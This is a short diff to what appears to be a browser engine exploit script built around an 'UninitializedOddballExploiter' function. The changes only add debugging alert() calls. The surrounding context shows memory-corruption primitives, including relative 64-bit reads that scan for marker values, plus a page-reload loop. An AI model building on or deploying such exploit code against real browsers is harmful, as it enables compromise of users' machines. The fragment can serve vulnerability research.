@@ -227,7 +227,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
             let value = relative_read64(i);
             helpers.set_i64(value);
             var [hi, lo] = helpers.get_u32_pair();
-
+            alert(hi);
             if (hi == 2734n || lo == 2734n) {
                 let prev2 = relative_read64(i - 2);
                 let prev1 = relative_read64(i - 1);
@@ -636,6 +636,9 @@ function main() {
         // alert(typeof(glob_uninitialized_oddball));
         location.hred = "test2.html"
         window.location.reload();
+    }
+    else{
+        alert(typeof(glob_uninitialized_oddball));
     }
     UninitializedOddballExploiter(glob_uninitialized_oddball);
 }
